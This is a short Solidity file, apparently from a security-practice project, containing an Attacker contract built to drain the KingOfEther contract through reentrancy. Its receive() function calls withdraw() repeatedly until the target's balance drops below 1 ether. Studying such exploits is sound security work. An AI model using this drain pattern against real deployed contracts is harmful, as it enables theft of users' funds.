// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {KingOfEther} from  "../src/KingOfEther.sol";
import {console2} from "forge-std/console2.sol";

/**
 * @title King Of Ether Attacker
 * @author 4b
 * @notice Attack contract to exploit the reentrancy in KING OF ETHER
 */
contract Attacker is KingOfEther{
    // Game 
    KingOfEther _kingOf;
    // Owner of game or deployer of game
    address public owner;


    // emit balance of indicated account
    event Bala(uint256);

    constructor(address _kingOfEther){
        _kingOf = KingOfEther(_kingOfEther);
        owner = msg.sender;
    }

    receive() external payable {
        console2.log(address(this).balance);
        if(address(_kingOf).balance>= 1e18){
            _kingOf.withdraw();
        }
    }

    // Attack Function
    function attack() public payable{
        require(msg.value>= 1e18);
        _kingOf.deposit{value: 5e18}(5e18);
        _kingOf.withdraw();
        emit Bala(address(this).balance);
    }
}